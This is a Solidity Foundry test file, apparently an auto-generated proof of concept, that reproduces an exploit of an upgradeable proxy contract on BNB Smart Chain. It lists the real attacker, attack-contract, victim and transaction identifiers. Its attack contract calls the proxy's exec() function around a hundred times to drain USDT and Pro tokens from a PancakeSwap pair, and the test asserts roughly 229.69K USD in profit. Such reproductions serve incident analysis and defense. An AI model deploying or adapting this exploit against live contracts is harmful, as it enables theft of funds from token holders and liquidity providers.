// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x0ee5f951c3e3ac22ef4bf98ad0b34d31561d7168
// Attack Contract : 0x6f2fb1dd8dff8af4919b642b70f2e29dc52ce25e
// Vulnerable Contract : 0xc44f2accac20598a3f2b4d489a970fcf52a04a3c
// Attack Tx : 0x4baf136bda10390fb657556c46a19c91b82c2a4c86a058884727c30a66449a50
// Block : 112658164
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : position_delta_reproduction
// Reproduced Value : 229.69K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 112658163;
    uint256 constant TX_TIMESTAMP = 1785256157;
    uint256 constant TX_BLOCK_NUMBER = 112658164;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 63;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        attack = new OurAttack();
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(0);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP, Addresses.USDT, "USDT", "position_delta", false, 229897259342639833602770, false
            )
        );
        economicOracles.push(
            EconomicOracle(Addresses.Cake_LP, Addresses.Pro, "Pro", "position_delta", true, 5576201512429, false)
        );
    }
}

contract OurAttack {
    function attack() public payable {
        _readPoolState();
    }

    function _readPoolState() internal {
        _readPoolState2();
        _readPoolState12();
        _readPoolState22();
        _readPoolState32();
        _readPoolState42();
        _readPoolState52();
    }

    function _readPoolState2() internal {
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).threshold();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
    }

    function _readPoolState12() internal {
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
    }

    function _readPoolState22() internal {
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
    }

    function _readPoolState32() internal {
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
    }

    function _readPoolState42() internal {
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
    }

    function _readPoolState52() internal {
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
        ITransparentUpgradeableProxy_C44F2A(Addresses.TransparentUpgradeableProxy_C44F2A).exec();
        IERC20Like(Addresses.Pro).balanceOf(Addresses.TransparentUpgradeableProxy_C44F2A);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x0Ee5f951c3E3ac22eF4BF98aD0B34d31561d7168; // Addresses.attacker_eoa = 0x0ee5f951c3e3ac22ef4bf98ad0b34d31561d7168 label=attacker_eoa roles=attacker_eoa|contract|sender source=tx_metadata.from confidence=high
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955; // Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=BEP20USDT token_symbol=USDT roles=asset|contract|economic_asset|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant Cake_LP = 0x63844BD4BFad910B1643713302a1cC1ed20d50c3; // Addresses.Cake_LP = 0x63844bd4bfad910b1643713302a1cc1ed20d50c3 label=PancakePair token_symbol=Cake-LP roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_path_entry = 0x6f2fb1dD8dFf8Af4919b642B70F2E29dC52CE25E; // Addresses.attack_path_entry = 0x6f2fb1dd8dff8af4919b642b70f2e29dc52ce25e label=attack_path_entry roles=attack_path_entry_contract|code_contract|contract|poc_reconstruction_surface|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant Pro = 0x8D65744527f55d0b2338350912d5C99A81ddF0e2; // Addresses.Pro = 0x8d65744527f55d0b2338350912d5c99a81ddf0e2 label=Token token_symbol=Pro roles=asset|contract|economic_asset|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant TransparentUpgradeableProxy_C44F2A = 0xc44f2acCAc20598A3F2b4D489A970Fcf52a04A3C; // Addresses.TransparentUpgradeableProxy_C44F2A = 0xc44f2accac20598a3f2b4d489a970fcf52a04a3c label=TransparentUpgradeableProxy roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
}

interface ITransparentUpgradeableProxy_C44F2A {
    function exec() external;
    function threshold() external view returns (uint256);
}

interface Iattack_path_entry {
    function exploit() external payable;
}

